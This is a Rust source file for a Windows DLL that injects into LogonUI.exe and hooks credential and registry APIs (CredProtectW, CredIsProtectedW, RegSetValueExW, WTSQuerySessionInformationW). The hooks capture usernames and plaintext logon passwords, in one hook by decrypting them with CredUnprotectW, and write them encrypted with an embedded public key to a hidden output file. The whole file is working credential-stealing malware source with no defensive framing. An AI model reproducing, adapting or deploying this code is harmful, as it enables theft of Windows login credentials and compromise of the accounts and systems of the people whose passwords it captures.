use crypto_common::encrypt_and_log_data_to_file;
use minhook_sys::{MH_CreateHook, MH_EnableHook, MH_Initialize, MH_Uninitialize, MH_OK};

use std::{
    env::current_exe,
    ffi::c_void,
    mem::transmute,
    ptr::null_mut,
    sync::{Mutex, Once},
};
use windows::{
    core::{PCSTR, PCWSTR, PWSTR},
    Win32::{
        Foundation::{BOOL, HANDLE, HINSTANCE},
        System::{
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            RemoteDesktop::{
                ProcessIdToSessionId, WTSUserName, WTS_CURRENT_SESSION, WTS_INFO_CLASS,
            },
            SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH},
            Threading::GetCurrentProcessId,
        },
    },
};

use windows_sys::Win32::{
    Foundation::WIN32_ERROR,
    Security::Credentials::{CredUnprotectW, CRED_PROTECTION_TYPE},
    System::Registry::{HKEY, REG_VALUE_TYPE},
};

#[cfg(debug_assertions)]
use {crypto_common::log_data, std::process};

const PUBLIC_KEY: &[u8; 32] = include_bytes!("../../public.key");
const OUTPUT_PATH: &str = env!("OUTPUT_PATH");

static START: Once = Once::new();

static mut ORIGINAL_CRED_IS_PROTECTED_W: *mut c_void = null_mut();
static mut ORIGINAL_REG_SET_VALUE_EX_W: *mut c_void = null_mut();
static mut ORIGINAL_WTS_QUERY_SESSION_INFORMATION_W: *mut c_void = null_mut();
static mut ORIGINAL_CRED_PROTECT_W: *mut c_void = null_mut();

static LAST_USERNAME: Mutex<String> = Mutex::new(String::new());

#[link(name = "wtsapi32", kind = "raw-dylib")]
extern "C" {
    fn WTSQuerySessionInformationW(
        hserver: HANDLE,
        sessionid: u32,
        wtsinfoclass: WTS_INFO_CLASS,
        ppbuffer: *mut PWSTR,
        pbytesreturned: *mut u32,
    ) -> usize;
}

// 2022 Server password
extern "C" fn cred_is_protected_w_hook(
    pszprotectedcredentials: PCWSTR,
    pprotectiontype: *mut CRED_PROTECTION_TYPE,
) -> BOOL {
    let original_func: unsafe extern "C" fn(
        pszprotectedcredentials: PCWSTR,
        pprotectiontype: *mut CRED_PROTECTION_TYPE,
    ) -> BOOL = unsafe { transmute(ORIGINAL_CRED_IS_PROTECTED_W as *const usize) };

    let ret_value = unsafe { original_func(pszprotectedcredentials, pprotectiontype) };

    if ret_value.as_bool() == true {
        let cred_len = unsafe { pszprotectedcredentials.as_wide().len() } + 1;

        if cred_len > u32::MAX as usize {
            return ret_value;
        }

        let cred_len = cred_len as u32;

        let mut password_size = 256 as u32; //CREDUI_MAX_PASSWORD_LENGTH
        let mut password = vec![0 as u16; password_size as usize];

        unsafe {
            CredUnprotectW(
                1,
                pszprotectedcredentials.as_ptr(),
                cred_len,
                password.as_mut_ptr(),
                &mut password_size,
            )
        };

        {
            let mut mutex_username = LAST_USERNAME.lock().unwrap();

            let user_name = &*mutex_username;
            if !user_name.is_empty() {
                let utf16_user_name: Vec<u16> = format!("[LogonUI.exe] Username : {}", user_name)
                    .encode_utf16()
                    .collect();

                #[cfg(not(debug_assertions))]
                let _ = encrypt_and_log_data_to_file(
                    OUTPUT_PATH.to_string(),
                    &utf16_user_name,
                    PUBLIC_KEY,
                );
                #[cfg(debug_assertions)]
                let result = encrypt_and_log_data_to_file(
                    OUTPUT_PATH.to_string(),
                    &utf16_user_name,
                    PUBLIC_KEY,
                );

                #[cfg(debug_assertions)]
                {
                    if result.is_err() {
                        log_data(format!(
                            "Failed writing data to file {}\n",
                            OUTPUT_PATH.to_string()
                        ));
                    }
                }

                *mutex_username = String::new();
            }
        }

        let line: Vec<u16> = format!(
            "[LogonUI.exe] Password : {}",
            String::from_utf16_lossy(&password)
        )
        .encode_utf16()
        .collect();

        #[cfg(not(debug_assertions))]
        let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);
        #[cfg(debug_assertions)]
        let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

        #[cfg(debug_assertions)]
        {
            if result.is_err() {
                log_data(format!(
                    "Failed writing data to file {}\n",
                    OUTPUT_PATH.to_string()
                ));
            }
        }
    }

    ret_value
}

extern "C" fn reg_set_value_ex_w_hook(
    hkey: HKEY,
    lpvaluename: PCWSTR,
    reserved: u32,
    dwtype: REG_VALUE_TYPE,
    lpdata: *const u8,
    cbdata: u32,
) -> WIN32_ERROR {
    let original_func: extern "C" fn(
        hkey: HKEY,
        lpvaluename: PCWSTR,
        reserved: u32,
        dwtype: REG_VALUE_TYPE,
        lpdata: *const u8,
        cbdata: u32,
    ) -> WIN32_ERROR = unsafe { transmute(ORIGINAL_REG_SET_VALUE_EX_W as *const usize) };

    let ret_value = original_func(hkey, lpvaluename, reserved, dwtype, lpdata, cbdata);

    if let Ok(value_name) = unsafe { lpvaluename.to_string() } {
        if (&value_name).contains("LoggedOn")
            && !(&value_name).contains("Provider")
            && !(&value_name).contains("InfoSet")
            && !(&value_name).contains("LoggedOnUserSID")
        {
            if let Ok(user_name) = unsafe { PCWSTR(lpdata as *const u16).to_string() } {
                let utf16_user_name: Vec<u16> =
                    format!("[LogonUI.exe] ({}) Username : {}", value_name, user_name)
                        .encode_utf16()
                        .collect();

                #[cfg(not(debug_assertions))]
                let _ = encrypt_and_log_data_to_file(
                    OUTPUT_PATH.to_string(),
                    &utf16_user_name,
                    PUBLIC_KEY,
                );
                #[cfg(debug_assertions)]
                let result = encrypt_and_log_data_to_file(
                    OUTPUT_PATH.to_string(),
                    &utf16_user_name,
                    PUBLIC_KEY,
                );

                #[cfg(debug_assertions)]
                {
                    if result.is_err() {
                        log_data(format!(
                            "Failed writing data to file {}\n",
                            OUTPUT_PATH.to_string()
                        ));
                    }
                }
            }
        }
    }

    ret_value
}

extern "C" fn cred_protect_w_hook(
    fasself: BOOL,
    pszcredentials: PCWSTR,
    cchcredentials: u32,
    pszprotectedcredentials: PWSTR,
    pcchmaxchars: *mut u32,
    protectiontype: *mut CRED_PROTECTION_TYPE,
) -> BOOL {
    let password = unsafe { pszcredentials.to_string() };
    if password.is_ok() {
        {
            let mut mutex_username = LAST_USERNAME.lock().unwrap();

            let user_name = &*mutex_username;

            if !user_name.is_empty() {
                let utf16_user_name: Vec<u16> = format!("[LogonUI.exe] Username : {}", user_name)
                    .encode_utf16()
                    .collect();

                #[cfg(not(debug_assertions))]
                let _ = encrypt_and_log_data_to_file(
                    OUTPUT_PATH.to_string(),
                    &utf16_user_name,
                    PUBLIC_KEY,
                );
                #[cfg(debug_assertions)]
                let result = encrypt_and_log_data_to_file(
                    OUTPUT_PATH.to_string(),
                    &utf16_user_name,
                    PUBLIC_KEY,
                );

                #[cfg(debug_assertions)]
                {
                    if result.is_err() {
                        log_data(format!(
                            "Failed writing data to file {}\n",
                            OUTPUT_PATH.to_string()
                        ));
                    }
                }

                *mutex_username = String::new();
            }
        }

        let line: Vec<u16> = format!("[LogonUI.exe] Password : {}", password.unwrap())
            .encode_utf16()
            .collect();

        #[cfg(not(debug_assertions))]
        let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);
        #[cfg(debug_assertions)]
        let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

        #[cfg(debug_assertions)]
        {
            if result.is_err() {
                log_data(format!(
                    "Failed writing data to file {}\n",
                    OUTPUT_PATH.to_string()
                ));
            }
        }
    }

    let original_func: unsafe extern "C" fn(
        fasself: BOOL,
        pszcredentials: PCWSTR,
        cchcredentials: u32,
        pszprotectedcredentials: PWSTR,
        pcchmaxchars: *mut u32,
        protectiontype: *mut CRED_PROTECTION_TYPE,
    ) -> BOOL = { unsafe { transmute(ORIGINAL_CRED_PROTECT_W as *const usize) } };

    let ret_val = unsafe {
        original_func(
            fasself,
            pszcredentials,
            cchcredentials,
            pszprotectedcredentials,
            pcchmaxchars,
            protectiontype,
        )
    };
    ret_val
}

// This is the way to get username on Win11
extern "C" fn wts_query_session_information_w_hook(
    hserver: HANDLE,
    sessionid: u32,
    wtsinfoclass: WTS_INFO_CLASS,
    ppbuffer: *mut PWSTR,
    pbytesreturned: *mut u32,
) -> BOOL {
    let original_func: extern "C" fn(
        hserver: HANDLE,
        sessionid: u32,
        wtsinfoclass: WTS_INFO_CLASS,
        ppbuffer: *mut PWSTR,
        pbytesreturned: *mut u32,
    ) -> BOOL = unsafe { transmute(ORIGINAL_WTS_QUERY_SESSION_INFORMATION_W as *const usize) };

    let ret_val = original_func(hserver, sessionid, wtsinfoclass, ppbuffer, pbytesreturned);

    let mut current_session_id = 0;
    let result = unsafe { ProcessIdToSessionId(GetCurrentProcessId(), &mut current_session_id) };
    if result.is_err() {
        #[cfg(debug_assertions)]
        {
            log_data(format!("Failed calling ProcessIdToSessionId\n"));
        }

        return ret_val;
    }

    if wtsinfoclass == WTSUserName
        && (sessionid == WTS_CURRENT_SESSION || sessionid == current_session_id)
    {
        if let Ok(user_name) = unsafe { (*ppbuffer).to_string() } {
            if !user_name.is_empty() {
                let mut mutex_username = LAST_USERNAME.lock().unwrap();
                *mutex_username = user_name;
            }
        }
    }

    ret_val
}

fn hook_libs() {
    {
        // This is to ensure that the function is not optimized out and not imported
        let _x = WTSQuerySessionInformationW as usize;
    }

    if unsafe { MH_Initialize() } != MH_OK {
        #[cfg(debug_assertions)]
        {
            log_data(format!("PID : {} - Failed MH_Initialize\n", process::id()));
        }
        return;
    }

    let wtsaspi32 = unsafe { GetModuleHandleA(PCSTR("wtsapi32.dll\0".as_ptr())) };
    if wtsaspi32.is_ok() {
        let wtsapi32_handle = wtsaspi32.unwrap();

        // WTSQuerySessionInformationW
        let func = unsafe {
            GetProcAddress(
                wtsapi32_handle.clone(),
                PCSTR("WTSQuerySessionInformationW\0".as_ptr()),
            )
        };
        if func.is_some() {
            let wts_query_session_information_w_func = func.unwrap();
            if unsafe {
                MH_CreateHook(
                    wts_query_session_information_w_func as *mut c_void,
                    wts_query_session_information_w_hook as *mut c_void,
                    &mut ORIGINAL_WTS_QUERY_SESSION_INFORMATION_W,
                )
            } != MH_OK
            {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_CreateHook for WTSQuerySessionInformationW\n",
                        process::id(),
                    ));
                }
                return;
            }

            if unsafe { MH_EnableHook(wts_query_session_information_w_func as *mut c_void) }
                != MH_OK
            {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_EnableHook for WTSQuerySessionInformationW\n",
                        process::id()
                    ));
                }
                return;
            }
        }
    } else {
        #[cfg(debug_assertions)]
        {
            log_data(format!("PID : {} - wtsapi32 not yet loaded", process::id()));
        }
    }

    let sechost = unsafe { GetModuleHandleA(PCSTR("sechost.dll\0".as_ptr())) };
    if sechost.is_ok() {
        let sechost_handle = sechost.unwrap();

        // CredIsProtectedW
        let func =
            unsafe { GetProcAddress(sechost_handle.clone(), PCSTR("CredIsProtectedW\0".as_ptr())) };
        if func.is_some() {
            let cred_is_protected_func = func.unwrap();
            if unsafe {
                MH_CreateHook(
                    cred_is_protected_func as *mut c_void,
                    cred_is_protected_w_hook as *mut c_void,
                    &mut ORIGINAL_CRED_IS_PROTECTED_W,
                )
            } != MH_OK
            {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_CreateHook for CredIsProtectedW\n",
                        process::id()
                    ));
                }
                return;
            }

            if unsafe { MH_EnableHook(cred_is_protected_func as *mut c_void) } != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_EnableHook for CredIsProtectedW\n",
                        process::id()
                    ));
                }
                return;
            }
        }

        //CredProtectW
        let func =
            unsafe { GetProcAddress(sechost_handle.clone(), PCSTR("CredProtectW\0".as_ptr())) };
        if func.is_some() {
            let cred_protect_func = func.unwrap();
            if unsafe {
                MH_CreateHook(
                    cred_protect_func as *mut c_void,
                    cred_protect_w_hook as *mut c_void,
                    &mut ORIGINAL_CRED_PROTECT_W,
                )
            } != MH_OK
            {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_CreateHook for CredProtectW\n",
                        process::id()
                    ));
                }
                return;
            }

            if unsafe { MH_EnableHook(cred_protect_func as *mut c_void) } != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_EnableHook for CredProtectW\n",
                        process::id()
                    ));
                }
                return;
            }
        }
    }

    let kernelbase = unsafe { GetModuleHandleA(PCSTR("kernelbase.dll\0".as_ptr())) };
    if kernelbase.is_ok() {
        let kernelbase_handle = kernelbase.unwrap();
        let func = unsafe { GetProcAddress(kernelbase_handle, PCSTR("RegSetValueExW\0".as_ptr())) };

        if func.is_some() {
            let reg_set_value_ex_w = func.unwrap();
            if unsafe {
                MH_CreateHook(
                    reg_set_value_ex_w as *mut c_void,
                    reg_set_value_ex_w_hook as *mut c_void,
                    &mut ORIGINAL_REG_SET_VALUE_EX_W,
                )
            } != MH_OK
            {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_CreateHook for RegSetValueExW\n",
                        process::id()
                    ));
                }
                return;
            }

            if unsafe { MH_EnableHook(reg_set_value_ex_w as *mut c_void) } != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_EnableHook for RegSetValueExW\n",
                        process::id()
                    ));
                }
                return;
            }
        }
    }
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(dll_module: HINSTANCE, call_reason: u32, _: *mut ()) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            START.call_once(|| {
                if let Ok(exe_name) = current_exe() {
                    if exe_name.ends_with("LogonUI.exe") {
                        hook_libs();
                    }
                }
            });
        }
        DLL_PROCESS_DETACH => unsafe {
            if MH_Uninitialize() != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID {} - Failed to uninitialize MinHook",
                        process::id()
                    ));
                }

                return false;
            }
        },
        _ => {}
    }

    true
}
